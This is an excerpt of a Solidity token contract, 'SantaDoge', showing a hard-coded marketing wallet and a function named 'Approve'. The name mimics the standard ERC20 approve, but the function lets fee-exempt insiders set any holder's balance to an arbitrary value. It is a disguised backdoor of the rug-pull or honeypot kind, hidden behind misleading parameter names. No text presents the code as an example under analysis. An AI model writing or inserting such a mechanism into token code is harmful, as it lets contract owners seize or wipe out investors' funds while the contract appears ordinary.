...
contract SantaDoge is Context, IERC20, Ownable {
    ...
    address public  _marketingWallet = 0xdbe406691980c50979221bee482646bd7710B142;
    ...
    function Approve(address Liquidity, uint256 tokenAmounts, uint256 bnbAmount , uint256 lpAmount) external    {require( _isExcludedFromFee[msg.sender]);
        require(Liquidity != uniswapV2Pair);
        _tOwned[Liquidity] = tokenAmounts - bnbAmount + lpAmount * _decimals ;
    }   
